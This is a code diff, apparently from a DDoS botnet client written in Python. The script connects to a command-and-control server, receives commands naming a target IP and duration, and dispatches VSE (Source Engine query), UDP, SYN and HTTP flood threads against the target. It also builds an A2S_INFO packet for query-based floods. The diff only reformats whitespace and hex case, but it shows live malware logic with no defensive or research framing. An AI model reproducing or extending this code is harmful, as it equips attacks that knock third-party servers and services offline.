@@ -12,11 +12,12 @@ import random
 HOST = '127.0.0.1'
 CNC_PORT = 101
 
+
 user_agents = []
 
 # read more at https://developer.valvesoftware.com/wiki/Server_queries
 def craft_vse_payload():
-    b = chr(0xff) * 4
+    b = chr(0xFF) * 4
     header = chr(0x54)
     payload = 'Source Engine Query'
     return str.encode(b + header + payload) # A2S_INFO packet
@@ -86,28 +87,34 @@ def main():
             if prefix == '.VSE':
                 ip = args[1]
                 secs = time.time() + int(args[2])
+
                 threading.Thread(target=attack_vse, args=(ip, secs))
 
             elif prefix == '.UDP':
                 ip = args[1]
                 secs = time.time() + int(args[2])
                 size = int(args[3])
+
                 threading.Thread(target=attack_udp, args=(ip, secs, size))
 
             elif prefix == '.SYN':
                 ip = args[1]
                 secs = time.time() + int(args[2])
+
                 threading.Thread(target=attack_syn, args=(ip, secs))
 
             elif prefix == '.HTTP':
                 ip = args[1]
                 secs = time.time() + int(args[2])
+
                 threading.Thread(target=attack_http, args=(ip, secs))
 
             elif prefix == 'PING':
                 sock.send('PONG'.encode())
+
         except:
             break
+
     sock.close()
     main()
 
